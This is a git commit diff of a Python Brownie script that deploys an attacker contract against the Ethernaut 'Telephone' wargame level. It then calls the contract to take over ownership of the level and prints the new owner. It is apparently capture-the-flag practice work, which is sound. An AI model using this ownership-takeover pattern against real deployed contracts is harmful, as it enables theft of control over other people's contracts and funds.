9d1539925ea2c5afb693c562eb30466c8f5db118
sarobinson2001 <sarobinson2011@gmail.com>
2023-08-23 14:54:45 +0100

    update deploy script to account for interface

--- scripts/04-deploy_attack.py
+++ scripts/04-deploy_attack.py
@@ -1,17 +1,21 @@
 from scripts.helpful_scripts import get_account
-from brownie import accounts, web3, config, interface, Attack04
+from brownie import accounts, config, interface, network, Attack04, Attack_Telephone
 
 ETHERNAUT_INSTANCE = "0xaA0349CfC5a3cE9FD3f24622F749799693b64354"
 
 
 def main():
-    # Ethernaut Instance
-    contract = ETHERNAUT_INSTANCE
+
     player = get_account()
 
-    # Deploy the attacker (proxy) contract: to call the Telephone contract
-    attack = Attack04.deploy(contract, {"from": player})
+    attacker_contract = Attack_Telephone.deploy(ETHERNAUT_INSTANCE, {"from": player})
+    attack_interface = interface.Iattack_telephone(attacker_contract.address)
+    telphone_interface = interface.Itelephone(ETHERNAUT_INSTANCE)
 
-    print(f"msg.sender = {player.address}\nattack address = {attack.address}")
+    attacker_contract.change({"from": player})
 
-    # tx = attack.changeOwner()
+    # There is a change of state in contract so need {'from':player})
+    attack_interface.change({"from": player})
+    owner = telphone_interface.owner()
+    print("Player is ", player)
+    print("Owner is", owner)
